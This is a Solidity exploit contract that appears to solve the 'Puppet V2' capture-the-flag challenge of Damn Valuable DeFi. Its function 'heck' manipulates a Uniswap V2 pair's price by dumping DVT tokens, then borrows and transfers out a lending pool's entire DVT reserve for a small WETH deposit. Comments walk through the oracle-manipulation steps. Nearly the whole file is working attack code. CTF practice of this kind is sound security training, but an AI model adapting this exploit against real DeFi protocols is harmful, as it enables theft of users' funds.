// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "@uniswap/v2-periphery/contracts/UniswapV2Router02.sol";
import "hardhat/console.sol";

///////////////////
// INTERFACES /////
///////////////////
interface DamnValuableTokenPuppetV2 {
    function balanceOf(address) external returns (uint256);

    function approve(address, uint256) external returns (bool);

    function allowance(address owner, address spender)
        external
        returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
}

interface WETH9PuppetV2 is DamnValuableTokenPuppetV2 {
    function deposit() external payable;
}

interface PoolPuppetV2 {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

interface UniswapV2FactoryPuppetV2 {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

////////////////
// CONTRACT
////////////////

contract OnChainOracleGoBrr {
    PoolPuppetV2 puppetPool;
    WETH9PuppetV2 weth;
    DamnValuableTokenPuppetV2 dvt;
    UniswapV2Router02 uniswapRouter;

    constructor(
        address _puppetPoolAddr,
        address _wethAddr,
        address _dvtAddr,
        address payable _uniswapRouterAddr
    ) public {
        puppetPool = PoolPuppetV2(_puppetPoolAddr);
        weth = WETH9PuppetV2(_wethAddr);
        dvt = DamnValuableTokenPuppetV2(_dvtAddr);
        uniswapRouter = UniswapV2Router02(_uniswapRouterAddr);
    }

    /**
    @dev Invoke this to hack
    @notice Attacker must give this contract approval of all their DVT tokens and send all value (ETH) before running this
    @notice 
         * The vulnerability here is that the Lending pool reads DVT prices from an on-chain 'oracle' - the Uniswap v2 pair. Through a liquidity manipulation (through swap), we can tilt the exchange rate in our favour, and essentially empty the DVT reserve of lending pool for a very low amount of WETH.
         * 
         * This manipulation is simple - we must inflate the amount of DVT in the exchange so that it gets devalued to WETH
         * 
         * Here's the attack steps:
         * 
         *  1. Swap Del DVT = 10000, and take WETH from both swap and attacker
            2. Amount of loan needed from lender = 1000000 DVT
               Use combined WETH as collateral (with new WETH conversion rate from manipulated Uniswap exchange)
         
     */
    function heck() external payable {
        uint256 dvtAmt = dvt.allowance(msg.sender, address(this));

        // Get WETH and DVT
        dvt.transferFrom(msg.sender, address(this), dvtAmt);
        weth.deposit{value: address(this).balance - 0.1 ether}();

        // Swap DVT for WETH (to inflate DVT compared to WETH)
        dvt.approve(address(uniswapRouter), dvtAmt);

        address[] memory swapPath = new address[](2);
        swapPath[0] = address(dvt);
        swapPath[1] = address(weth);

        uniswapRouter.swapExactTokensForTokens(
            dvtAmt,
            1,
            swapPath,
            address(this),
            block.timestamp + 3 minutes
        );

        // Get exchange rate
        uint256 wethRequiredForAttack = puppetPool
            .calculateDepositOfWETHRequired(dvt.balanceOf(address(puppetPool)));
        uint256 dvtToSteal = dvt.balanceOf(address(puppetPool));

        // Make use of new exchange rate and take all the Pool's DVT
        weth.approve(address(puppetPool), wethRequiredForAttack);
        puppetPool.borrow(dvtToSteal);

        // Pass on DVT to attacker
        dvt.transfer(msg.sender, dvtToSteal);
    }
}
